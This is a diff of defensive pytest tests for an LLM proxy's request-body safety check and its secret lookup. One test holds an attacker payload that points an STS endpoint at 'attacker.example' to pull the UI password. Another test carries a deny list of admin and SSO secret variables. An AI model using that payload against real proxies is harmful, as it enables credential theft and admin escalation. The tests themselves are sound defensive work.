@@ -110,6 +110,29 @@ def test_is_request_body_safe_rejects_indirection_via_nested_metadata():
         )
 
 
+def test_is_request_body_safe_rejects_indirection_via_request_body_wrapper():
+    # ``/utils/transform_request`` wraps real provider params in a
+    # ``request_body`` field (``{call_type, request_body: {...}}``).
+    # ``is_request_body_safe`` descends into ``request_body`` so the
+    # wrapper-shaped attacker can't smuggle banned keys or indirection
+    # prefixes past the boundary check.
+    body = {
+        "call_type": "completion",
+        "request_body": {
+            "model": "bedrock/anthropic.claude-v2",
+            "aws_web_identity_token": "oidc/env/UI_PASSWORD",
+            "aws_sts_endpoint": "http://attacker.example/sts",
+        },
+    }
+    with pytest.raises(ValueError):
+        is_request_body_safe(
+            request_body=body,
+            general_settings={},
+            llm_router=None,
+            model="bedrock/anthropic.claude-v2",
+        )
+
+
 def test_is_request_body_safe_rejects_indirection_via_litellm_embedding_config():
     # ``_NESTED_CONFIG_KEYS`` descent path — values inside
     # ``litellm_embedding_config`` are walked one level deep for
@@ -175,6 +198,31 @@ def test_get_secret_allows_non_denied_var_via_os_environ_prefix(monkeypatch):
     # indirections continue to resolve.
     monkeypatch.setenv("MY_CUSTOM_VAR", "my-value")
     assert get_secret("os.environ/MY_CUSTOM_VAR") == "my-value"
+
+
+@pytest.mark.parametrize(
+    "var",
+    [
+        "UI_PASSWORD",
+        "UI_USERNAME",
+        "PROXY_ADMIN_ID",
+        "GOOGLE_CLIENT_SECRET",
+        "MICROSOFT_CLIENT_SECRET",
+        "AZURE_CLIENT_SECRET",
+        "OAUTH_CLIENT_SECRET",
+        "OPENID_CLIENT_SECRET",
+        "GENERIC_CLIENT_SECRET",
+    ],
+)
+def test_get_secret_refuses_ui_and_sso_secrets(var, monkeypatch):
+    # The UI / SSO secrets feed admin-authentication paths. Reading
+    # them via request-body-driven indirection is a one-step
+    # internal_user → PROXY_ADMIN escalation.
+    monkeypatch.setenv(var, "the-secret")
+    with pytest.raises(ValueError, match="not exposable"):
+        get_secret(f"os.environ/{var}")
+    with pytest.raises(ValueError, match="not exposable"):
+        get_secret(f"oidc/env/{var}")
 
 
 def test_get_secret_allows_bare_name_for_denied_var(monkeypatch):
